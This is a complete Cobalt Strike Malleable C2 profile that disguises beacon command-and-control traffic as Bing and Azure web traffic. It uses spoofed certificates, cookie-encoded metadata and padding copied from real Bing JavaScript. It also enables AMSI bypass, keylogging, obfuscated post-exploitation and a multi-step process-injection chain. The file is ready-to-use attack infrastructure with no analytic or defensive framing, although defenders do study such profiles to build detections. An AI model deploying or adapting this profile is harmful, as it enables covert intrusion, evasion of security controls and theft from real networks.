## Cobalt Strike Malleable C2 Profile
## Version: Cobalt Strike 4.2
## Date   : 2022-01-14 14:57:17

## Profile Name
##set sample_name "CobaltStrike Beacon";

## Sleep Times
set sleeptime "39000";
set jitter    "14";
set data_jitter "107";

## Beacon User-Agent
set useragent "Mozilla/5.0 (Windows NT 4.0) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/13.0.883.0 Safari/532.1";

## Self-signed SSL Certificates with SSL Beacon
## Stager
https-certificate {
    set C   "TG";
    set CN  "www.bing.com";
    set O   "bing.com";
    set OU  "bing.com";
    set validity "365";
}

## TCP Beacon
set tcp_port "25076";
set tcp_frame_header "\x80";

## SMB beacons
set pipename         "mojo.5688.8052.183894939787088877##";
set pipename_stager  "mojo.5688.8052.35780273329370473##";
set smb_frame_header "\x80";

## DNS beacons
set maxdns          "251";
set dns_max_txt     "248";
set dns_idle        "8.8.4.4";
set dns_sleep       "0";
set dns_stager_prepend "v=spf1 a:mail.google.com -all";
set dns_stager_subhost ".img.123456.";

## SSH beacons
set ssh_banner        "OpenSSH_7.4 Debian (protocol 2.0)";
set ssh_pipename      "wkssvc##";

#code-signer {
#    set keystore "keystore.jks";
#    set password "123456";
#    set alias    "google";
#}

## Staging process
set host_stage "false";
http-stager {
    set uri_x86 "/webapi/v6/Update";
    set uri_x64 "/webapi/v3/Update";

    server {
        header "Content-Type" "application/x-javascript; charset=utf-8";
        header "Server" "Windows-Azure-Blob/1.0 Microsoft-HTTPAPI/2.0";
        header "ETag" "0x8D817F967913E10";
        header "Content-MD5" "v6UAv4ZT5/VxZIZKh5Y+eQ==";
        header "x-ms-lease-status" "unlocked";
        header "timing-allow-origin" "*";
        output {
            prepend " t(n){for(var i=[],t=0;t<n.length;t++)i.push(n[t]);return i}function i(n){if(n){var t=window.getComputedStyle(n);return t&&t.display==\"none\"?!0:i(n.parentElement)}return!1}function o(n){for(var r,e=t(n.querySelectorAll(u)),f=0;f<e.length;f++)if(r=e[f],!i(r)&&r.tabIndex!=-1)return r;return null";
            prepend "var HeaderPlusAlgo_Selector;(function(n){function e(n){for(var u,l,h,e=[],c=t(sj_b.querySelectorAll(f+(n?\", :focus\":\"\"))),s=0;s<c.length;s++)u=c[s],u.className.indexOf(\"b_ans\")!=-1||u.id==\"b_pole\"?(l=t(u.querySelectorAll(r)),l.length==0&&(h=o(u),h&&e.push(h))):i(u)||e.push(u);return e}function";
            append "}var r=\"#b_results h2 a,#b_results h3 a,#b_results h4 a\",u=\"input, select, textarea,a[href],*[tabindex = '0']\",f=r+\",#b_results .b_ans,#b_content #b_pole\";n.getSelectableElements=e})(HeaderPlusAlgo_Selector||(HeaderPlusAlgo_Selector={}));NavSelector=HeaderPlusAlgo_Selector.getSelectableElements";
            print;
        }
    }

    client {
        header "Accept" "*/*";
        header "Accept-Language" "en-US,en;q=0.5";
        header "Accept-Encoding" "gzip, deflate";
    }
}

## Post Exploitation
post-ex {
    set spawnto_x86 "%windir%\\syswow64\\taskeng.exe";
    set spawnto_x64 "%windir%\\sysnative\\taskeng.exe";
    set obfuscate "true";
    set smartinject "true";
    set amsi_disable "true";
    set pipename "srvsvc_##";
    set keylogger "GetAsyncKeyState";
}

process-inject {

    set allocator "NtMapViewOfSection";
    set min_alloc "17500";
    set startrwx "false";
    set userwx   "false";

    transform-x86 {
        prepend "\x90\x90";
    }

    transform-x64 {
        prepend "\x90\x90";
        append "\x90\x90";
    }


    execute {
        # The order is important! Each step will be attempted (if applicable) until successful
        ## self-injection
        CreateThread "ntdll!RtlUserThreadStart+0x42";
        CreateThread;
        ## Injection via suspened processes (SetThreadContext|NtQueueApcThread-s)
        # SetThreadContext;
        NtQueueApcThread-s;
        # CreateRemotThread - Vanilla cross process injection technique. Doesn't cross session boundaries
        CreateRemoteThread;
        # RtlCreateUserThread - Supports all architecture dependent corner cases (e.g., 32bit -> 64bit injection) AND injection across session boundaries
        RtlCreateUserThread;
    }
}

## HTTP Headers
http-config {
    set headers "Date, Server, Content-Length, Keep-Alive, Connection, Content-Type";
    header "Server" "Apache";
    header "Keep-Alive" "timeout=10, max=100";
    header "Connection" "Keep-Alive";
    # Use this option if your teamserver is behind a redirector
    set trust_x_forwarded_for "true";
}

## HTTP GET
http-get {

    set uri "/rp/olDmcxJ0RfBy1PQIY51XMK-7EcM.gz.js";
    set verb "GET";

    client {

        header "Accept-Encoding" "gzip, deflate";
        header "Connection" "close";
        header "Referer" "https://www.bing.com/";


        #header "Host" "r.bing.com";

        metadata {
            base64url;
            prepend "ANID=";
            prepend "__Secure-3PAPISID=noskin;";
            append ";CONSENT=YES+CN.zh-CN+20210917-09-0";
            header "Cookie";
        }
    }

    server {

        header "Server" "Windows-Azure-Blob/1.0 Microsoft-HTTPAPI/2.0";
        header "Content-Type" "application/x-javascript; charset=utf-8";
        header "X-MSEdge-Ref" "Ref A4EAA043E47314793BBFE1CFBD4810146 Ref BHKG30EDGE0820 Ref C2022-01-14T06:52:58Z";
        header "X-Azure-Ref-OriginShield" "Ref A03E6EA3B4D8B47E88C93E210C6734EDB Ref BSG2EDGE2422 Ref C2022-01-10T06:59:52Z";
        header "Cache-Control" "public, max-age=432000";
        header "x-ms-lease-status" "unlocked";
        output {
            netbiosu;
            prepend "biUtil.rt.querySelectorAll(\".sbiinflnk[data-link]\"),r=function(t){var i=t.target;i.hasAttribute(n)&&(i.href=i.getAttribute(";
            prepend "var SbiPrivacy;(function(){function t(){var i,r,t,u;if(typeof SbiUtil!=\"undefined\"&&SbiUtil.rt&&_d.querySelectorAll)for(i=S";
            append "n),i.removeAttribute(n))},t=0;t<i.length;t++){u=i[t];SbiUtil.oncop(u,r)}}var n=\"data-link\";t()})(SbiPrivacy||(SbiPrivacy={}))";
            print;
        }
    }
}

## HTTP POST
http-post {

    set uri "/rewardsapp/ncheader";
    set verb "POST";

    client {

        header "Content-Type" "text/plain;charset=UTF-8";
        header "Content-type" "application/x-www-form-urlencoded";
        header "Connection" "close";


        #header "Host" "www.bing.com";

        id {
            base64url;
            parameter "formid";
        }

        parameter "wysiwyg" "HCRPGTiZRZ";
        parameter "goods_group_id" "NIUsMvgL";

        output {
            base64url;
            prepend "aid=522005705&accver=1&showtype=embed&ua=";
            print;
        }
    }

    server {

        header "Server" "Apache";
        header "Content-Type" "text/html; charset=utf-8";
        header "Pragma" "no-cache";
        header "Accept-CH" "Sec-CH-UA-Bitness, Sec-CH-UA-Arch, Sec-CH-UA-Full-Version, Sec-CH-UA-Mobile, Sec-CH-UA-Model, Sec-CH-UA-Platform-Version, Sec-CH-UA-Platform, Sec-CH-UA, UA-Bitness, UA-Arch, UA-Full-Version, UA-Mobile, UA-Model, UA-Platform-Version, UA-Platform, UA";
        header "X-Cache" "CONFIG_NOCACHE";

        output {
            base64;
            prepend "on v(n,t){if(s(n,t)){var i=new RegExp(\"(\\\\s|^)\"+t+\"(\\\\s|$)\",\"g\");n.className=n.className.replace(i,\" \")}}function b(n){i&&(s(i,o)?nt(n):e(n))}function k(n){i&&(!i||s(i,o)?nt(n):e(n),sj_evt.unbind(w,k))}function ct(){u&&sj_ue(u,h,b,!1)}function d(n){typeof _H!=\"undefined\"&&(n&&n>0?lt():g())}function lt(){a(u,\"rigleamon\")}function g(){v(u,\"rigleamon\")}function nt(n){if(sj_evt.fire(\"focusChange\",\"bep\"),i){i.firstChild||(r=t(\"iframe\"),r.id=\"bepfm\",r.frameBorder=\"no\",r.scrolling=\"no\",r.height=0,sj_be(r,tt,yt,!1),i.appendChild(r),f=t(\"div\"),f.id=\"bepfl\",f.innerText=f.textContent=\"Loading...\",i.appendChild(f),vt(f));var w=_w.location.search.substr(1),g=/(^|&)rewardstesthooks=1(&|$)/i.exec(w),b=/(?:^|&)rewardsbag=([^&]*)(?:&|$)/i.exec(w),s=new Date,k=s.getDate(),d=s.getMonth()+1,nt=(d<10?\"0\":\"\")+d+\"/\"+(k<10?\"0\":\"\")+k+\"/\"+s.getFullYear();r.src=\"/rewardsapp/bepflyoutpage?style=modular&date=\"+nt+(g&&b?\"&atlahostname=localhost&bag=\"+b[1]:\"\"";
            prepend "<script type=\"text/javascript\">//<![CDATA[var bepns=bepns||function(n,t){function rt(){if(u=n(\"id_rh\"),i=n(\"bepfo\"),!i){var r=n(\"id_rwl\");r&&(i=t(\"div\"),i.id=\"bepfo\",i.className=o,r.parentNode&&r.parentNode.insertBefore(i,r.nextSibling))}ft();sj_be(u,h,b,!1);sj_evt.bind(w,k,!1);sj_evt.bind(p,ht);sj_evt.bind(\"onP1\",ut,1);sj_evt.bind(\"id:refreshed\",et,1)}function ut(){var n=0,t=setInterval(function(){u&&u.offsetWidth>0&&u.offsetHeight>0?(clearInterval(t),sj_evt.fire(\"bepready\",d)):n==80&&clearInterval(t);n++},400)}function ft(){st(u,it)}function et(){ot(_ge(\"idd_rwds\"),_ge(\"idd_rwdstrial\"))}function ot(n,t){n&&t&&(t.href=n.href,n.h?t.h=n.h:n.getAttribute&&n.getAttribute(\"h\")&&t.setAttribute(\"h\",n.getAttribute(\"h\")))}function st(n,t){n&&(n.href=t)}function ht(n){n[1]!==y&&e()}function s(n,t){if(n&&n.className){var i=\" \"+n.className+\" \";return i.indexOf(\" \"+t+\" \")!==-1}return!1}function a(n,t){n&&!s(n,t)&&(n.className+=\" \"+t)}functi";
            append ");v(i,o);u.setAttribute(\"aria-expanded\",\"true\")}a(u,\"openfo\");sj_sp(n);sj_evt.fire(p,y);sj_be(_d,h,e,!0);sj_be(_d,c,l,!0)}function e(n){s(i,o)||a(i,o);v(u,\"openfo\");typeof _H!=\"undefined\"&&g();u.setAttribute(\"aria-expanded\",\"false\");sj_ue(_d,h,e,!0);sj_ue(_d,c,l,!0);r&&r.contentWindow&&sj_ue(r.contentWindow.document,c,l,!0);n&&sj_sp(n)}function at(n){n&&(n.style.display=\"none\")}function vt(n){n&&(n.style.display=\"block\")}function yt(){at(f);r.height=Math.min(r.contentWindow.document.body.scrollHeight,569);r&&r.contentWindow&&sj_be(r.contentWindow.document,c,l,!0)}var y=\"bepfo\",p=\"onPopTR\",w=\"openbep\",u,i,f,r,h=\"click\",c=\"keyup\",tt=\"load\",o=\"b_hide\",it=\"javascript:void(0)\",l=function(n){var f=n.which||n.keyCode,i=sj_et(n),t;if(f==27){e(n);u.focus();return}if(f==9&&i&&r){if(t=i.nodeName,t==\"BODY\"||t==\"HTML\"||t==\"#document\")return;r.contentWindow.document.body.contains(i)||e(n)}};return rt(),{sg:d,ubc:ct}}(_ge,sj_ce);//]]></script>";
            print;
        }
    }
}
